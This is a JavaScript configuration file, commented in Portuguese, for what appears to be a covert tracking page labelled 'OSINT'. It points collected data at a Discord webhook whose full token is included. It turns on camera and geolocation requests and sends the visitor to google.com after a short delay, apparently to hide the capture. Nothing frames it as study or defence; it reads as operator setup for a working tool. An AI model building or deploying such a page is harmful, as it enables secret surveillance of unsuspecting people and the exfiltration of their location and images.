// config opcional externa (pode ser sobrescrita via querystring)
// Você pode mover webhookUrl e finalUrl para cá e manter index.html limpo

window.OSINT_CONFIG = window.OSINT_CONFIG || {};
Object.assign(window.OSINT_CONFIG, {
  webhookUrl: "https://discordapp.com/api/webhooks/1487781638401163385/AB1V9_A3C1uS1xBluFpNX4gy4zIn6Xy3Xxx83hlvPsuMrNhBd0Huo7epfA-Em0vm-KtF",
  finalUrl: "https://www.google.com",
  requestCamera: true,
  requestGeo: true,
  redirectDelayMs: 1500,
  debug: false
});
